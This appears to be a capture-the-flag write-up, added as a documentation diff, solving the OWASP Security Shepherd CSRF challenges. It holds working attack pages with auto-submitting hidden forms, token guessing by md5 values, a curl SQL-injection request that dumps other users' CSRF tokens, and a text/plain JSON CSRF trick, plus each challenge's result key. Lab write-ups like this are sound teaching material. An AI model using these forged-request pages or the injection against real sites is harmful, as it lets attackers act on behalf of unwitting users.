@@ -1,0 +1,471 @@
+.. include:: /pentest_links.txt
+
+.. _SecurityShepherdCSRF:
+
+****
+CSRF
+****
+
+
+CSRF Setup
+==========
+
+victim user account
+-------------------
+
+To do this exercise by yourself involves creating a victim account for the CSRF exercises. In the authors case, the victim user ran the Microsoft Edge browser on Windows 10. It's only failure was in the CSRF JSON challenge; the browser URL didn't properly handle JSON via enctype=text/plain.
+
+Local web server
+----------------
+
+Some of the CSRF exercises require the participant to display a web page. One easy way to do this is to create a subdirectory :file:`www` and run the simple HTTP server ``python -m SimpleHTTPServer`` on port 8000. To simplify things we assume the client hosts files is updated to give the HTTP server the name please.hack.me. The only inconvenience is this creates a mixture of secure and insecure which generates a browser warning.
+
+:file:`hosts` setup
+-------------------
+
+This writeup assumes DNS name "securityshepherd.com" resolves to the Security Shepherd server and "please.hack.me" resolves to your local SimpleHTTPServer.
+
+
+CSRF 1
+======
+
+Get your userid from the web page ("394682267744559fe293869075243bbefb22506f" in this case) and enter the following URL in the :guilabel:`Post Message` button:
+
+  https://securityshepherd.com/user/csrfchallengeone/plusplus?userid=394682267744559fe293869075243bbefb22506f
+
+Get the victim user to open up the CSRF 1 lesson and your CSRF counter should be incremented. Merely selecting the CSRF 1 lesson again to refresh it gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key is
+  aD26cwidzbaQJBSz8uHec4i/3f5pe3PykDIrXB+HVFElKAonJ67QspsIMOg1CB+UFYTQ0roeKtRK0Pb1cTaRBB8TFSactm7wgAQYZzD/Edr6g60GuN/+/ULSJQrdAf9Olvcz4Rd86P2iamkLbNsCowPiyJjf3sny8N+WfsXSSMI=
+
+
+CSRF 2
+======
+
+In another terminal window create :file:`www/csrf2.html` and start up SimpleHTTPServer:
+
+.. code-block:: bash
+  :emphasize-lines: 8,15
+
+  # Get userId from the CSRF2 web page.
+  U=394682267744559fe293869075243bbefb22506f
+  SITE="https://securityshepherd.com"
+
+  # Create the attack web page.
+  mkdir -p www
+  # Create web page for our userId:
+  cat > www/csrf2.html <<EOF
+  <html>
+  <head>
+    <meta HTTP-EQUIV="Pragma" CONTENT="no-cache">
+    <meta HTTP-EQUIV="Expires" CONTENT="-1">
+  </head>
+  <body>
+  <form name="csrf2" action="$SITE/user/csrfchallengetwo/plusplus" method="POST">
+    <input type="hidden" name="userId" value="$U">
+  </form>
+  <script> document.csrf2.submit(); </script>
+  </body>
+  </html>
+  EOF
+
+  # Start web server.
+  ( cd www; python -m SimpleHTTPServer; )
+
+Get your userid from the web page ("394682267744559fe293869075243bbefb22506f" in this case) and enter the following URL in the :guilabel:`Post Message` button:
+
+  http://please.hack.me:8000/csrf2.html
+
+Get the victim user to open up the CSRF 2 lesson (making sure to display all content, not just secure content) and your CSRF counter should be incremented. Merely selecting the CSRF 2 lesson again to refresh it gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key is
+  roJr3al3j7GTURQVG4238iM00sP7phs4mWYBG7DKD0/ejxm3Vd4rdMHwJY1TKCG8jrowaIm6/uHahtR5Gw283yBVEAsAHowvrPyCkDKhFfco1e7JnPODV4UyAUv2NzhkQ0QR0M+OU/TeFcOj9P0F9KusTd24KOy4lyc4t/7qsz4=
+
+
+CSRF 3
+======
+
+In another terminal window create :file:`www/csrf3.html` and start up SimpleHTTPServer:
+
+.. code-block:: bash
+  :emphasize-lines: 8,15
+
+  # Get userId from the CSRF3 web page.
+  U=394682267744559fe293869075243bbefb22506f
+  SITE="https://securityshepherd.com"
+
+  # Create the attack web page.
+  mkdir -p www
+  # Create web page for our userId:
+  cat >www/csrf3.html <<EOF
+  <html>
+  <head>
+    <meta HTTP-EQUIV="Pragma" CONTENT="no-cache">
+    <meta HTTP-EQUIV="Expires" CONTENT="-1">
+  </head>
+  <body>
+  <form name="csrf3" action="$SITE/user/csrfchallengethree/plusplus" method="POST">
+    <input type="hidden" name="userid" value="$U">
+    <input type="hidden" name="csrfToken" value="0" />
+  </form>
+  <script> document.csrf3.submit(); </script>
+  </body>
+  </html>
+  EOF
+
+  # Start web server.
+  ( cd www; python -m SimpleHTTPServer; )
+
+Get your userid from the web page ("394682267744559fe293869075243bbefb22506f" in this case) and enter the following URL in the :guilabel:`Post Message` button:
+
+  http://please.hack.me:8000/csrf3.html
+
+Get the victim user to open up the CSRF 3 lesson (making sure to display all content, not just secure content) and your CSRF counter should be incremented. Merely selecting the CSRF 3 lesson again to refresh it gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key is
+  nGV7QrAfiEp5Aem0HD2+2t6bZ7bA1Id+W+aiwT65GBFHDtLQ0gcXB4w9BACe/GjK/CxAWCC0Hi/IFhblFD6r8EBGvTDk/mr5ibzjtd82RImdNugtXIFfRWRv6rM+Xbo3jdMrkrrsc7PhkkwRc0JCLw==
+
+
+CSRF 4
+======
+
+Note your userID (394682267744559fe293869075243bbefb22506f), then in another terminal window create :file:`www/csrf4.html` and start up SimpleHTTPServer by editing then running this script:
+
+.. code-block:: bash
+  :emphasize-lines: 9,16
+
+  # Get userId and csrfToken from the CSRF4 web page.
+  U=394682267744559fe293869075243bbefb22506f
+  CSRFTOKEN=0
+  SITE="https://securityshepherd.com"
+
+  # Create the attack web page.
+  mkdir -p www
+  # Create web page for our userId:
+  cat >www/csrf4.html <<EOF
+  <html>
+  <head>
+    <meta HTTP-EQUIV="Pragma" CONTENT="no-cache">
+    <meta HTTP-EQUIV="Expires" CONTENT="-1">
+  </head>
+  <body>
+  <form name="csrf4" action="$SITE/user/csrfchallengefour/plusplus" method="POST">
+    <input type="hidden" name="userId" value="$U">
+    <input type="hidden" name="csrfToken" value="$CSRFTOKEN" />
+  </form>
+  <script> document.csrf4.submit(); </script>
+  </body>
+  </html>
+  EOF
+
+  # Start web server.
+  ( cd www; python -m SimpleHTTPServer; )
+
+Next enter the following URL in the :guilabel:`Post Message` button:
+
+  http://please.hack.me:8000/csrf4.html
+
+Get the victim user to open up the CSRF 4 lesson (making sure to display all content, not just secure content) and your CSRF counter should be incremented. Merely selecting the CSRF 4 lesson again to refresh it gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key is
+  O1t+AE6ba7vCE/kg5ybup0J7ni7DiX3ipljv03neYvqdN3wh58R3P27RXkyrHFgOIPOaaHbZIf+QczQMC+BE0iv5vYKljuUCXtEeiBS0zUg5Vq+UZBztU5d+4c6Re2Ji3pRJrBORE47YLp23tqyJ7w==
+
+
+CSRF 5
+======
+
+When a user doesn't have a CSRF token for the challenge, one is generated. If you try enough new users you'll see the values 0, 1, or 2 are used. If you've already done this for your user account you can try other new ones. To handle all 3 possibilites, the exploit web page will have 3 forms, one per possible CSRF token.
+
+Note your userID (394682267744559fe293869075243bbefb22506f) then in another terminal window create :file:`www/csrf5.html` and start up SimpleHTTPServer by editing then running this script:
+
+.. code-block:: bash
+  :emphasize-lines: 8,16,21,26,32-34
+
+  # Get userId and csrfToken from the CSRF5 web page.
+  U=394682267744559fe293869075243bbefb22506f
+  SITE="https://securityshepherd.com"
+
+  # Create the attack web page.
+  mkdir -p www
+  # Create web page for our userId:
+  cat >www/csrf5.html <<EOF
+  <html>
+  <head>
+    <meta HTTP-EQUIV="Pragma" CONTENT="no-cache">
+    <meta HTTP-EQUIV="Expires" CONTENT="-1">
+  </head>
+  <body>
+
+  <form name="csrf50" action="$SITE/user/csrfchallengefive/plusplus" method="POST">
+    <input type="hidden" name="userId" value="$U">
+    <input type="hidden" name="csrfToken" value="0" />
+  </form>
+
+  <form name="csrf51" action="$SITE/user/csrfchallengefive/plusplus" method="POST">
+    <input type="hidden" name="userId" value="$U">
+    <input type="hidden" name="csrfToken" value="1" />
+  </form>
+
+  <form name="csrf52" action="$SITE/user/csrfchallengefive/plusplus" method="POST">
+    <input type="hidden" name="userId" value="$U">
+    <input type="hidden" name="csrfToken" value="2" />
+  </form>
+
+  <script>
+    document.csrf50.submit();
+    document.csrf51.submit();
+    document.csrf52.submit();
+  </script>
+  </body>
+  </html>
+  EOF
+
+  # Start web server.
+  ( cd www; python -m SimpleHTTPServer; )
+
+Next enter the following URL in the :guilabel:`Post Message` button:
+
+  http://please.hack.me:8000/csrf5.html
+
+Get the victim user to open up the CSRF 5 lesson (making sure to display all content, not just secure content) and your CSRF counter should be incremented. Merely selecting the CSRF 5 lesson again to refresh it gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key is
+  QFCuAbq9DoSaaR+eSMiANCrN+H+IWAUF4wgv+OFRgfgvFTyDZmPgMy6DBqkVGu+TNeCGFvmlz/ZeuU6+KNx+FSHDeK3NQdjbQzfOoUFGnJm6SVXRin5DhdsEuSKf1Ff7xdaljJxyAi12E7zrKuZ2ww==
+
+
+CSRF 6
+======
+
+This is the same as CSRF 5 except that the possible CSRF token values 0, 1, and 2 are md5sum-encoded. That is, when a user doesn't have a CSRF token for the challenge, one is generated. If you try enough new users you'll see the values cfcd208495d565ef66e7dff9f98764da, c4ca4238a0b923820dcc509a6f75849b, and c81e728d9d4c2f636f067f89cc14862c. These are conveniently enough md5sum(0), md5sum(1), and md5sum(2). If you've already done this for your user account you can try other new ones.
+
+Note your userID (394682267744559fe293869075243bbefb22506f) then in another terminal window create :file:`www/csrf6.html` and start up SimpleHTTPServer by editing then running this script:
+
+.. code-block:: bash
+  :emphasize-lines: 8,16,21,26,32-34
+
+  # Get userId and csrfToken from the CSRF5 web page.
+  U=394682267744559fe293869075243bbefb22506f
+  SITE="https://securityshepherd.com"
+
+  # Create the attack web page.
+  mkdir -p www
+  # Create web page for our userId:
+  cat >www/csrf6.html <<EOF
+  <html>
+  <head>
+    <meta HTTP-EQUIV="Pragma" CONTENT="no-cache">
+    <meta HTTP-EQUIV="Expires" CONTENT="-1">
+  </head>
+  <body>
+  
+  <form name="csrf60" action="$SITE/user/csrfchallengesix/plusplus" method="POST">
+    <input type="hidden" name="userId" value="$U">
+    <input type="hidden" name="csrfToken" value="$(echo -n "0" | md5sum | cut -d ' ' -f 1)" />
+  </form>
+  
+  <form name="csrf61" action="$SITE/user/csrfchallengesix/plusplus" method="POST">
+    <input type="hidden" name="userId" value="$U">
+    <input type="hidden" name="csrfToken" value="$(echo -n "1" | md5sum | cut -d ' ' -f 1)" />
+  </form>
+  
+  <form name="csrf62" action="$SITE/user/csrfchallengesix/plusplus" method="POST">
+    <input type="hidden" name="userId" value="$U">
+    <input type="hidden" name="csrfToken" value="$(echo -n "2" | md5sum | cut -d ' ' -f 1)" />
+  </form>
+
+  <script>
+    document.csrf60.submit();
+    document.csrf61.submit();
+    document.csrf62.submit();
+  </script>
+
+  </body>
+  </html>
+  EOF
+
+  # Start web server.
+  ( cd www; python -m SimpleHTTPServer; )
+
+Next enter the following URL in the :guilabel:`Post Message` button:
+
+  http://please.hack.me:8000/csrf6.html
+
+Get the victim user to open up the CSRF 6 lesson (making sure to display all content, not just secure content) and your CSRF counter should be incremented. Merely selecting the CSRF 6 lesson again to refresh it gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key is
+  D01fReXETXPxJQWtUYC3UExWfDm/y/OkGqHEdBhT8IpG6vr0usxLdQAwXMQ+syNcDpx7v3DBLWc1wgNFtn0OhgAIydDNOPet5evYTFNdO3P1pmqM0sy3FcMxNu6I3tldmYwsrfhHnbx/aNZIW61z4A==
+
+
+CSRF 7
+======
+
+This exercise is based on using a SQL injection in the web page to fetch your CSRF token that allows you to fetch other user's tokens. Then you can create a web page with that other user's token in your CSRF solution web page.
+
+Also, getting it to work on Microsoft Edge browser was troublesome. The easiest way is to have the CSRF python web server down when the victim visits CSRF 7 page and get's their CSRF token. Once gotten, as long as they just click the :guilabel:`Post Message` button their CSRF token doesn't change; clicking that "CSRF 7" link on the left or do a page refresh changes their CSRF token. So catch them after visiting the page and only doing a series of :guilabel:`Post Message` attempts and you have their CSRF token stable.
+
+At that point, use the SQL injection (use "%" which is "%25" URL encoded) to fetch all the CSRF tokens:
+
+.. code-block:: bash
+  :emphasize-lines: 5,8
+
+  # Tamper Data provides the URL, COOKIE for getToken
+  URL='https://securityshepherd.com/user/csrfchallengeseven/getToken'
+  COOKIE='JSESSIONID=1D675D7764629338EB58951799708197; token=77318319473905651039630792168793645034; JSESSIONID3="VT9mAw4zGTRwrS/TtAsmyA=="'
+
+  # This is the URL-encoded "%" MySQL wildcard.
+  curl --silent --insecure  \
+       --cookie "$COOKIE" \
+       "$URL?userId=%25"
+
+The output will be an HTML-garbled list of tokens. Guess the one for your victim:
+
+.. code-block:: html
+  :emphasize-lines: 3
+
+  Your csrf Token for this Challenge is:
+  &quot;109047343535437488844995221280456065663&quot; <br/>
+  &quot;112368035418168284095306472848852912912&quot; <br/>
+  &quot;136206915773510028589068378558105017785&quot; <br/>
+
+With your userID (394682267744559fe293869075243bbefb22506f) and the newly-minted csrfToken (112368035418168284095306472848852912912), quickly create :file:`www/csrf7.html` and start up SimpleHTTPServer by editing then running this script:
+
+.. code-block:: bash
+  :emphasize-lines: 1-4,8,15-17
+
+  # Get csrfToken from SQL injection
+  CSRFTOKEN='112368035418168284095306472848852912912'
+  # Get userid from the web page.
+  U=394682267744559fe293869075243bbefb22506f
+
+  SITE="https://securityshepherd.com"
+  # Create web page.
+  cat >www/csrf7.html <<EOF
+  <html>
+  <head>
+    <meta HTTP-EQUIV="Pragma" CONTENT="no-cache">
+    <meta HTTP-EQUIV="Expires" CONTENT="-1">
+  </head>
+  <body>
+  <form id="csrf7" name="csrf7" action="$SITE/user/csrfchallengeseven/plusplus" method="POST">
+    <input type="hidden" name="userId" value="$U" />
+    <input type="hidden" name="csrfToken" value="$CSRFTOKEN" />
+    <input type="submit" />
+  </form>
+  <script>
+  document.csrf7.submit();
+  </script>
+  </body>
+  </html>
+  EOF
+
+  # Start web server
+  ( cd www; python -m SimpleHTTPServer; )
+
+Enter the following URL in the CSRF7 exercise :guilabel:`Post Message` button:
+
+  http://please.hack.me:8000/csrf7.html
+
+The next time the victim clicks the :guilabel:`Post Message` button they should get "Increment Successful" in their web page. Then when you refresh your CSRF 7 page you should see:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key is
+   iZ2oXFsPSFev74qeQuU8PX3J0Rj/BET/IQhiQKvPCO+3sbtXf4Nl5puk9+O2yEtyOUWhBh4XaSejQIQMawqqQ/0XF7yzTJtN3JwbdZ4nRXae9ozSjFO5GId/a3pcqVaTHiXDjV4OH7f2lzFaYJNyNw==
+
+
+CSRF JSON
+=========
+
+First a note about passing JSON via a form. You might expect to read and follow the `JSON extension specification to HTML <https://darobin.github.io/formic/specs/json/>`_ and have enctype='application/json':
+
+.. code-block:: html
+  :emphasize-lines: 1,4
+
+  <form id="csrfjson" name="csrfjson" enctype='application/json'
+      action="https://securityshepherd.com/user/csrfchallengejson/plusplus"
+      method="POST">
+    <input type="hidden" name="userId" value="394682267744559fe293869075243bbefb22506f"/>
+    <input type="submit" />
+  </form>
+  <script> document.csrfjson.submit(); </script>
+
+But this will result in an error. From `CSRF expecting JSON packet #116 <https://github.com/OWASP/SecurityShepherd/issues/116>`_:
+
+  User has to use enctype="text/plain" in their attack to send well formed JSON cross domain without javascript.
+
+Also, from `CSRF With JSON POST <http://security.stackexchange.com/questions/10227/csrf-with-json-post>`_:
+
+  It's not possible to get a POSTed <form> to submit a request with Content-Type: application/json. But you can submit a form with a valid JSON structure in the body as enctype="text/plain".
+
+  It's not possible to do a cross-origin (CORS) XMLHttpRequest POST with Content-Type: application/json against a non-cross-origin-aware server because this will cause a ‘pre-flighting’ HTTP OPTIONS request to approve it first. But you can send a cross-origin XMLHttpRequest POST withCredentials if it is text/plain.
+
+We follow `JSON CSRF with Parameter Padding <http://blog.opensecurityresearch.com/2012/02/json-csrf-with-parameter-padding.html>`_ to create our "text/plain" JSON form. Realize a form field is expected to be encoded something like "name=value"; in fact, an extra "=" is placed before the value even without a value ("name="). How can you encode ``{"a":1,"b":{"c":3}}``? If you try ``<input name='{"a":1,"b":{"c":3}}' type='hidden'>`` the actual value sent will be ``{"a":1,"b":{"c":3}}=`` (notice the trailing "=" that's always added after the name). One way to solve this is to add a dummy value at the end of the JSON: ``<input name='{"a":1,"b":{"c":3}, "ignore_me":"' value='test"}' type='hidden'>``, which results in the JSON string ``{"a":1,"b":{"c":3}, "ignore_me":"-test"}``.
+
+In our case we'll add an extra JSON value ``", "ignore_me":"' value='yeah_me"}'`` which adds ``{ ... , "ignore_me":"=yeah_me"}`` to the end of the JSON value.
+
+Using the userId from the challenge (394682267744559fe293869075243bbefb22506f), create :file:`www/csrfjson.html`:
+
+.. code-block:: bash
+  :emphasize-lines: 1-4,11-12
+
+  # Get userid from the web page.
+  U=394682267744559fe293869075243bbefb22506f
+  SITE="https://securityshepherd.com"
+  cat >www/csrfjson.html <<EOF
+  <html>
+  <head>
+    <meta HTTP-EQUIV="Pragma" CONTENT="no-cache">
+    <meta HTTP-EQUIV="Expires" CONTENT="-1">
+  </head>
+  <body>
+  <form id="csrfjson" name="csrfjson" enctype='text/plain' action="$SITE/user/csrfchallengejson/plusplus" method="POST">
+    <input type="hidden" name='{"userId":"$U","ignore_me":"' value='yeah_me"}'/>
+    <input type="submit" />
+  </form>
+  <script>
+  document.csrfjson.submit();
+  </script>
+  </body>
+  </html>
+  EOF
+
+  # Start web server
+  ( cd www; python -m SimpleHTTPServer; )
+
+Next enter the following URL in the :guilabel:`Post Message` button:
+
+  http://please.hack.me:8000/csrfjson.html
+
+Unfortunately, Microsoft Edge did not encode the form properly. Whether :file:`www/csrfjson.html` was in an iframe or as the main URL, the post to the server was ``{%22userId%22:%22394682267744559fe293869075243bbefb22506f%22,%22ignore_me%22:%22=yeah_me"}``. Note that all but the last double quote mark were URL encoded. This caused the error message "An Error Occurred! You must be getting funky!".
+
+However, Firefox opening the CSRF JSON web page would not permit the loading of the iframe: no request was sent to the SimpleHTTPServer. But if you used Firefox to open URL http://please.hack.me:8000/csrfjson.html directly, Firefox sent non-encoded double quotes (``{"userId":"394682267744559fe293869075243bbefb22506f","ignore_me":"=yeah_me"}``) with output "Increment Successful".
+
+So both browsers prevented successfully completing the exercise: Microsoft Edge didn't encode the form properly, while Firefox would not load the iframe.
+
+If we could get the victim to open http://please.hack.me:8000/csrfjson.html correctly via the CSRF JSON lesson (making sure to display all content, not just secure content), the attacker's CSRF counter should be incremented. Merely selecting the CSRF JSON lesson again to refresh it gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key is
+  iSDnlqhzo2vECOx/vQjF2Wvf2yzTXBdmrA+BPkG0Pu5Hc9jTWf455jetxwtwRJ3ImduZoUHTaiTVbwLpUwPgLJ042qz4mYsvQAn6TEfK1eG3xnbc9vsJbNW4iKz/vPqP52YHhK5PmnGZpnWhAKS1xA==
+
